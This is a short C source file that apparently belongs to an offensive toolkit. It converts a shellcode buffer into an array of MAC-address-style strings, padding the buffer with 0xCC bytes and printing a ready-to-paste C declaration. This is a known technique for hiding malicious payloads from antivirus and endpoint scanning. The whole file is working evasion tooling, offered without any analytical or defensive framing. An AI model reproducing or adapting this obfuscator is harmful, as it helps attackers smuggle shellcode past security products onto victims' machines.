#include "GenerateMac.h"

VOID GenerateMAC(IN INT A, IN INT B, IN INT C, IN INT D, IN INT E, IN INT F, OUT PCHAR mac_string)
{
    unsigned char           output[18]              = { 0x00 };
    sprintf_s(output, sizeof(output), "%0.2X-%0.2X-%0.2X-%0.2X-%0.2X-%0.2X", A, B, C, D, E, F);
    memcpy(mac_string, output, sizeof(output));
}

BOOL GenerateMacOutput(IN PBYTE shellcode, IN SIZE_T shellcode_size) {

    PBYTE                    new_shellcode           = shellcode;
    SIZE_T                   new_shellcode_size      = shellcode_size;

    if (shellcode_size % 6 != 0x00)
    {
        new_shellcode_size                          = (shellcode_size + 6) - (shellcode_size % 6);
        new_shellcode                               = HeapAlloc(GetProcessHeap(), 0, new_shellcode_size);
        memset(new_shellcode, 0xCC, new_shellcode_size);
        memcpy(new_shellcode, shellcode, shellcode_size);
    }

    printf("char* mac_array [%d] = {\n    ", (INT)(new_shellcode_size / 6));

    for (INT i = 0, j = 0; i < new_shellcode_size; i++)
    {
        if (i % 6 == 0)
        {
            unsigned char mac[18] = { 0x00 };

            j++;

            GenerateMAC(
                new_shellcode[i + 0x0], new_shellcode[i + 0x1],
                new_shellcode[i + 0x2], new_shellcode[i + 0x3],
                new_shellcode[i + 0x4], new_shellcode[i + 0x5],
                mac
            );

            if (i == new_shellcode_size - 6)
            {
                printf("\"%s\"", mac);
            }
            else
            {
                printf("\"%s\", ", mac);
            }
            if (j % 4 == 0)
            {
                printf("\n    ");
            }
        }
    }
    printf("\n};\n");
}
